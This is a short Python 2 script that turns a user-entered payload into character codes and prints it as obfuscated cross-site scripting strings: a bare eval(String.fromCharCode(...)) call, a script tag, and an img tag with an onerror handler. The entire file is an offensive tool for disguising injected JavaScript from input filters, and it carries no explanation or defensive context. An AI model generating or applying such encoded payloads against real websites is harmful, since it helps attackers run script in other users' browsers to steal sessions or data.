


payload = raw_input('Payload: ')



p_encoded = []
for i in payload:
	p_encoded.append(str(ord(i)))

print '------------------------------------------------'
print 'Javascript code:'
print 'eval(String.fromCharCode('+','.join(p_encoded)+'))'
print '------------------------------------------------'
print 'Script tag:'
print '<script>eval(String.fromCharCode('+','.join(p_encoded)+'));</script>'
print '------------------------------------------------'
print 'Img Tag'
print '<img src=X_asd onerror=eval(String.fromCharCode('+','.join(p_encoded)+'))>'
print '------------------------------------------------'
